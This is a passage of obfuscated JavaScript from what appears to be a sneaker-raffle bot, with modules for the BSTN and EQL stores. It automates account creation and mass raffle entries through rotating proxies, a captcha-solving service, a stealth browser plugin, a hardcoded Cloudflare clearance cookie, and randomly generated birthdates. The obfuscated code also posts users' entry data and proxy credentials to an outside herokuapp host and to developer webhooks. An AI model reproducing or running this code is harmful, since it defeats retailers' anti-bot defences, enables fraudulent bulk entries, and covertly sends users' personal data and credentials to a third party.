                        _0x51b97d(_0x3148db['name'] + '\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20/\x20' + _0x1751b5['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x222f85 = Math['round'](Math['random']() * (_0x108580['length'] - 0x1)), _0x4b41c3 = _0x108580[_0x222f85]['split'](':'), _0x2ccbab;
                        try {
                            _0x2ccbab = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4b41c3[0x0] + ':' + _0x4b41c3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2ccbab = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4b41c3[0x0] + ':' + _0x4b41c3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9c0c3d = await _0x2ccbab['newPage'](), _0x3b30cf = await _0x9c0c3d['target']()['createCDPSession'](), { windowId: _0x32381b } = await _0x3b30cf['send']('Browser.getWindowForTarget');
                            await _0x9c0c3d['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x3eb8ff = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x9c0c3d['authenticate']({
                                'username': '' + _0x4b41c3[0x2],
                                'password': '' + _0x4b41c3[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9c0c3d['goto']('' + _0x1751b5[_0x3e05e3]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x9c0c3d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x3b30cf['send']('Browser.setWindowBounds', {
                                'windowId': _0x32381b,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1a282d(0x1388), await _0x9c0c3d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x9c0c3d['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x9c0c3d['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x34337a => _0x34337a['click']()), await _0x9c0c3d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x9c0c3d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a282d(0x7d0), await _0x9c0c3d['waitForSelector']('#email-login'), await _0x9c0c3d['type']('#email-login', '' + _0x1751b5[_0x3e05e3]['Email']), await _0x1a282d(0xdac), await _0x9c0c3d['waitForSelector']('#password'), await _0x9c0c3d['type']('#password', '' + _0x1751b5[_0x3e05e3]['Password'], { 'delay': 0xe6 }), await _0x1a282d(0x157c);
                            try {
                                await _0x9c0c3d['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x5563dd => _0x5563dd['click']());
                            } catch {
                            }
                            try {
                                await _0x9c0c3d['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x5a7c2a) {
                            }
                            await _0x1a282d(0x3e8);
                            const _0x4f3703 = await _0x9c0c3d['$']('.enteredDraw_container__2KmQ_');
                            if (_0x4f3703)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1751b5[_0x3e05e3]['Size']);
                            try {
                                if (_0x1751b5[_0x3e05e3]['Size'] != 'RANDOM') {
                                    var _0x44c532 = _0x1751b5[_0x3e05e3]['Size']['replace']('.', ',');
                                    const _0x2b0ccf = await _0x9c0c3d['$x']('//div[contains(text(),\x20' + _0x44c532 + ')]');
                                    await _0x2b0ccf[0x0]['click']();
                                } else {
                                    const _0xd97654 = await _0x9c0c3d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x242cf6 = Math['round'](Math['random']() * (_0xd97654['length'] - 0x1));
                                    await _0xd97654[_0x242cf6]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x1a282d(0x1f4);
                            const _0x534818 = await _0x9c0c3d['$']('.addressList_addressItem__LE2PB');
                            if (_0x534818 && _0x1751b5[_0x3e05e3]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x9c0c3d['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1a282d(0x5dc), await _0x9c0c3d['waitForSelector']('#firstname'), await _0x9c0c3d['type']('#firstname', '' + _0x1751b5[_0x3e05e3]['FirstName']), await _0x1a282d(0x1f4), await _0x9c0c3d['waitForSelector']('#firstname'), await _0x9c0c3d['type']('#lastname', '' + _0x1751b5[_0x3e05e3]['LastName']), await _0x1a282d(0x1f4), await _0x9c0c3d['waitForSelector']('#firstname'), await _0x9c0c3d['type']('#street', '' + _0x1751b5[_0x3e05e3]['Address1']), await _0x1a282d(0x1f4), await _0x9c0c3d['waitForSelector']('#firstname'), await _0x9c0c3d['type']('#houseNumber', _0x1751b5[_0x3e05e3]['HouseNumber'] + '\x20' + _0x1751b5[_0x3e05e3]['Address2']), await _0x1a282d(0x1f4), await _0x9c0c3d['waitForSelector']('#firstname'), await _0x9c0c3d['select']('#country_code', '' + _0x1751b5[_0x3e05e3]['Country']), await _0x1a282d(0x1f4), await _0x9c0c3d['type']('#postcode', '' + _0x1751b5[_0x3e05e3]['Zip']), await _0x1a282d(0x1f4), await _0x9c0c3d['type']('#city', '' + _0x1751b5[_0x3e05e3]['City']), await _0x1a282d(0x1f4), await _0x9c0c3d['type']('#telephone', '' + _0x1751b5[_0x3e05e3]['Phone']), await _0x1a282d(0x1f4), await _0x9c0c3d['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x1a282d(0x9c4);
                            try {
                                await _0x9c0c3d['type']('#instagram_name', '' + _0x1751b5[_0x3e05e3]['Follower']), await _0x9c0c3d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1a282d(0x5dc);
                            try {
                                await _0x9c0c3d['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x1a282d(0x5dc), await _0x9c0c3d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3acd35 => _0x3acd35['click']()), await _0x1a282d(0x1388);
                            try {
                                await _0x9c0c3d['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x9c0c3d['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x1751b5[_0x3e05e3]['Size'] != 'RANDOM') {
                                    var _0x44c532 = _0x1751b5[_0x3e05e3]['Size']['replace']('.', ',');
                                    const _0xc58252 = await _0x9c0c3d['$x']('//div[contains(text(),\x20' + _0x44c532 + ')]');
                                    await _0xc58252[0x0]['click']();
                                } else {
                                    const _0x4ac79e = await _0x9c0c3d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x242cf6 = Math['round'](Math['random']() * (_0x4ac79e['length'] - 0x1));
                                    await _0x4ac79e[_0x242cf6]['click']();
                                }
                                await _0x1a282d(0x5dc);
                                try {
                                    await _0x9c0c3d['hover']('#instagram_name'), await _0x9c0c3d['type']('#instagram_name', '' + _0x1751b5[_0x3e05e3]['Follower']), await _0x9c0c3d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x57086a + '\x20/\x205)');
                                try {
                                    await _0x9c0c3d['hover']('.checkBox_boxHolder__wLGVe'), await _0x1a282d(0x5dc), await _0x9c0c3d['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x1a282d(0x157c), await _0x9c0c3d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x128013 => _0x128013['click']()), await _0x1a282d(0x1388), await _0x9c0c3d['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x37deb3 = 'no', _0xe19c06(_0x1751b5[_0x3e05e3], _0x3148db);
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x56d48f),
                                    'proxy': '' + _0x108580[_0x3e05e3]
                                };
                                var _0x741211 = JSON['stringify'](prxdata);
                                let _0x353d34 = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x741211, _0x353d34);
                            } catch (_0x14fab3) {
                            }
                            console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x5bf4b5 = await _0x4ee25a(_0x1751b5[_0x3e05e3], _0x3148db, 'dev', ![]), _0xb648f1 = await _0x4ee25a(_0x1751b5[_0x3e05e3], _0x3148db, 'pub', ![]);
                            const _0x239fa2 = {
                                'succesDEVMSG': { 'embeds': [_0x5bf4b5] },
                                'succesPUBMSG': { 'embeds': [_0xb648f1] }
                            };
                            let _0x56d48f = _0x1751b5[_0x3e05e3];
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x3148db['name'],
                                    'entrydata': JSON['stringify'](_0x56d48f),
                                    'proxy': '' + _0x108580[_0x3e05e3]
                                };
                                var _0x741211 = JSON['stringify'](prxdata);
                                let _0x4f974e = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x741211, _0x4f974e);
                            } catch (_0x4c6987) {
                            }
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x239fa2['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x239fa2['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x239fa2['succesPUBMSG']);
                            } catch (_0x2a17ce) {
                                console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2a17ce));
                            }
                        } catch (_0x783144) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20' + _0x783144)), _0x37deb3 = 'yes', _0x617a9e = '' + _0x783144;
                            var _0x5ed152 = await _0x4ee25a(_0x1751b5[_0x3e05e3], _0x3148db, 'dev', !![], _0x617a9e), _0x5bf4b5 = await _0x4ee25a(_0x1751b5[_0x3e05e3], _0x3148db, 'dev', ![]), _0xb648f1 = await _0x4ee25a(_0x1751b5[_0x3e05e3], _0x3148db, 'pub', ![]);
                            const _0x1f3bca = {
                                'succesDEVMSG': { 'embeds': [_0x5bf4b5] },
                                'succesPUBMSG': { 'embeds': [_0xb648f1] }
                            };
                            _0x1f3bca['errorDEV'] = { 'embeds': [_0x5ed152] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x1f3bca['errorDEV']), await _0x4e4e57(_0x4cd13, _0x1f3bca['errorDEV']);
                        } finally {
                            _0x2ccbab['close']();
                            if (_0x37deb3 == 'yes' && _0x57086a != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x57086a + '\x20/\x205)')), _0x3e05e3 = _0x3e05e3 - 0x1, _0x57086a = _0x57086a + 0x1;
                                continue;
                            }
                            _0x37deb3 == 'yes' && _0x57086a >= 0x5 && (_0x1736ba(_0x1751b5[_0x3e05e3], _0x3148db), _0x37deb3 = 'no', _0x57086a = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x281b0a, _0x4b3513) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x751aa5;
                    try {
                        const _0x428003 = _0x5a26e1['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x751aa5 = _0xdfd901['parse'](_0x428003, { 'header': !![] })['data'];
                    } catch (_0x527a4a) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x5406a7 = 0x0; _0x5406a7 < _0x751aa5['length']; _0x5406a7++) {
                        if (_0x3c815c != 'yes')
                            var _0x3c815c = '', _0xab4baa = 0x0;
                        var _0x87dc12;
                        _0x51b97d(_0x281b0a['name'] + '\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20/\x20' + _0x751aa5['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x52d762 = await _0x4ee25a(_0x751aa5[_0x5406a7], _0x281b0a, 'acc', ![]);
                        const _0xcc0df4 = { 'succesDEVMSG': { 'embeds': [_0x52d762] } }, _0x1fed9a = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x1c14d3 = Math['round'](Math['random']() * (_0x4b3513['length'] - 0x1)), _0x5e2d07 = _0x4b3513[_0x1c14d3]['split'](':'), _0x1a402c;
                        try {
                            _0x1a402c = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e2d07[0x0] + ':' + _0x5e2d07[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1a402c = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e2d07[0x0] + ':' + _0x5e2d07[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x185d63 = await _0x1a402c['newPage']();
                            await _0x185d63['authenticate']({
                                'username': '' + _0x5e2d07[0x2],
                                'password': '' + _0x5e2d07[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x185d63['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x185d63['setRequestInterception'](!![]), _0x185d63['on']('request', _0x46242b => {
                                _0x46242b['resourceType']() === 'image' ? _0x46242b['abort']() : _0x46242b['continue']();
                            });
                            try {
                                await _0x185d63['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x185d63['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x3c815c = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x185d63['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1a282d(0x3e8), await _0x185d63['type']('#email', _0x751aa5[_0x5406a7]['Email']), await _0x1a282d(0x1f4), await _0x185d63['type']('#pass', _0x751aa5[_0x5406a7]['Password']), await _0x1a282d(0x1f4), await _0x185d63['$eval']('#login-form', _0x404bbd => _0x404bbd['submit']());
                            try {
                                await _0x185d63['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x1a282d(0x190);
                            const _0x2db07b = await _0x185d63['evaluate'](() => {
                                const _0x1543bb = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x1543bb['map'](_0x46b3a7 => _0x46b3a7['alt']);
                            }), _0x46a927 = await _0x185d63['evaluate'](() => {
                                const _0x28a2a4 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x28a2a4['map'](_0x9cddb8 => _0x9cddb8['innerHTML']);
                            }), _0x27b6bf = await _0x185d63['$$']('.raffle-winner');
                            if (_0x27b6bf['length'] < 0x1) {
                                console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x3c815c = 'no';
                                continue;
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20' + _0x27b6bf['length'] + '\x20Wins\x20Found!');
                            for (var _0x453bc6 = 0x0; _0x453bc6 < _0x27b6bf['length']; _0x453bc6++) {
                                console['log'](_0x17b918['green'](_0x2db07b[_0x453bc6] + _0x46a927[_0x453bc6]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0xfa242f) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20' + _0xfa242f)), _0x87dc12 = '' + _0xfa242f;
                            var _0x244b87 = await _0x4ee25a(_0x751aa5[_0x5406a7], _0x281b0a, 'acc', !![], _0x87dc12);
                            _0xcc0df4['errorDEV'] = { 'embeds': [_0x244b87] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0xcc0df4['errorDEV']), await _0x4e4e57(_0x4cd13, _0xcc0df4['errorDEV']), _0x3c815c = 'yes';
                        } finally {
                            if (_0x1a402c)
                                _0x1a402c['close']();
                            if (_0x3c815c == 'yes' && _0xab4baa != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Task\x20' + (_0x5406a7 + 0x1) + '\x20:\x20Retrying\x20(' + _0xab4baa + '\x20/\x205)')), _0x5406a7 = _0x5406a7 - 0x1, _0xab4baa = _0xab4baa + 0x1;
                                continue;
                            }
                            _0x3c815c == 'yes' && _0xab4baa >= 0x5 && (_0x1736ba(_0x751aa5[_0x5406a7], _0x281b0a), _0x3c815c = 'no', _0xab4baa = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x281b0a['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x5c694e, _0x65dd89, _0xfa6da9) {
                _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x64917e['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5790a1 = 0x0; _0x5790a1 < _0x65dd89['length']; _0x5790a1++) {
                    var _0x11e5c3;
                    _0x51b97d(_0x5c694e['name'] + '\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20/\x20' + _0x65dd89['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                    try {
                        await _0x120beb(_0x65dd89, _0x5790a1);
                    } catch {
                        _0x3fc93e = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x56e8ad(_0x3dd093) {
                        const _0x64b690 = _0x5a26e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x3fe002 = _0xdfd901['parse'](_0x64b690, { 'header': !![] })['data'];
                        let _0xd1e6f8 = ![];
                        for (var _0x2e904c of _0x3fe002) {
                            if (_0x2e904c['Url'] == _0x3dd093['Url'] && _0x2e904c['Email'] == _0x3dd093['Email']) {
                                _0xd1e6f8 = !![];
                                break;
                            }
                        }
                        return _0xd1e6f8;
                    }
                    if (await _0x56e8ad(_0x65dd89[_0x5790a1]) == !![]) {
                        console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4d2ab4 = ![];
                    const _0x141027 = _0x5a26e1['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x26f78b = _0xdfd901['parse'](_0x141027, { 'header': !![] })['data'];
                    for (var _0x20f1ae of _0x26f78b) {
                        _0x20f1ae['Email'] == _0x65dd89[_0x5790a1]['Email'] && (_0x4d2ab4 = !![]);
                    }
                    if (_0x4d2ab4 == ![]) {
                        var _0x229222;
                        if (_0x65dd89[_0x5790a1]['Url']['endsWith']('/')) {
                            _0x229222 = _0x65dd89[_0x5790a1]['Url'] + 'register';
                            if (_0x3fc93e != 'yes')
                                var _0x3fc93e = '', _0x567057 = 0x0;
                        } else {
                            _0x229222 = _0x65dd89[_0x5790a1]['Url'] + '/register';
                            if (_0x3fc93e != 'yes')
                                var _0x3fc93e = '', _0x567057 = 0x0;
                        }
                        if (_0x65dd89[_0x5790a1]['Email'] == '' || _0x65dd89[_0x5790a1]['FirstName'] == '' || _0x65dd89[_0x5790a1]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x65dd89[_0x5790a1]['Password'] == '' && (_0x65dd89[_0x5790a1]['Password'] = 'JRaffles23!');
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0xd7aeca = _0xfa6da9[_0x5790a1]['split'](':');
                        else
                            var _0x1d7367 = Math['round'](Math['random']() * (_0xfa6da9['length'] - 0x1)), _0xd7aeca = _0xfa6da9[_0x1d7367]['split'](':');
                        var _0x21c963;
                        try {
                            _0x21c963 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd7aeca[0x0] + ':' + _0xd7aeca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21c963 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd7aeca[0x0] + ':' + _0xd7aeca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x179e6a = await _0x21c963['newPage']();
                            await _0x179e6a['authenticate']({
                                'username': '' + _0xd7aeca[0x2],
                                'password': '' + _0xd7aeca[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x179e6a['setRequestInterception'](!![]), _0x179e6a['on']('request', _0x261ce1 => {
                                _0x261ce1['resourceType']() === 'image' || _0x261ce1['resourceType']() === 'font' || _0x261ce1['resourceType']() === 'media' ? _0x261ce1['abort']() : _0x261ce1['continue']();
                            });
                            try {
                                await _0x179e6a['goto'](_0x229222);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1a282d(0x3e8), await _0x179e6a['waitForSelector']('#email'), await _0x179e6a['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x1a282d(0x3e8);
                            try {
                                await _0x179e6a['click']('li[data-value=\x22EU\x20' + _0x65dd89[_0x5790a1]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x65dd89[_0x5790a1]['Size']);
                            }
                            await _0x1a282d(0x6a4), await _0x179e6a['type']('#email', '' + _0x65dd89[_0x5790a1]['Email']), await _0x1a282d(0x352), await _0x179e6a['waitForSelector']('#password'), await _0x179e6a['type']('#password', '' + _0x65dd89[_0x5790a1]['Password']), await _0x1a282d(0x352), await _0x179e6a['type']('#phone', '' + _0x65dd89[_0x5790a1]['Phone']), await _0x1a282d(0x352), await _0x179e6a['type']('#firstName', '' + _0x65dd89[_0x5790a1]['FirstName']), await _0x1a282d(0x352), await _0x179e6a['type']('#lastName', '' + _0x65dd89[_0x5790a1]['LastName']), await _0x1a282d(0x352);
                            _0x65dd89[_0x5790a1]['Url']['includes']('footlocker.de') ? await _0x179e6a['type']('#birthdate', _0x55124d(0x1, 0x1c) + '.' + _0x55124d(0x1, 0xc) + '.' + _0x55124d(0x7c6, 0x7d3)) : await _0x179e6a['type']('#birthdate', _0x55124d(0x1, 0x1c) + '-' + _0x55124d(0x1, 0xc) + '-' + _0x55124d(0x7c6, 0x7d3));
                            await _0x1a282d(0x352), await _0x179e6a['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x179e6a['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x1a282d(0x1f4), await _0x179e6a['click']('#stateAutocomplete'), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x1a282d(0x1f4);
                            try {
                                const _0x57fa04 = await _0x179e6a['$x']('//li[text()=\x22' + _0x65dd89[_0x5790a1]['State'] + '\x22]');
                                await _0x57fa04[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x1a282d(0x3e8), await _0x1a282d(0x1f4), await _0x179e6a['type']('#address1', _0x65dd89[_0x5790a1]['Address1'] + '\x20' + _0x65dd89[_0x5790a1]['HouseNumber']), await _0x1a282d(0x1f4), await _0x179e6a['type']('#address2', '' + _0x65dd89[_0x5790a1]['Address2']), await _0x1a282d(0x1f4), await _0x179e6a['type']('#city', '' + _0x65dd89[_0x5790a1]['City']), await _0x1a282d(0x1f4), await _0x179e6a['type']('#postcode', '' + _0x65dd89[_0x5790a1]['Zip']), await _0x1a282d(0x3e8), await _0x179e6a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a282d(0x3e8), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x179e6a['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
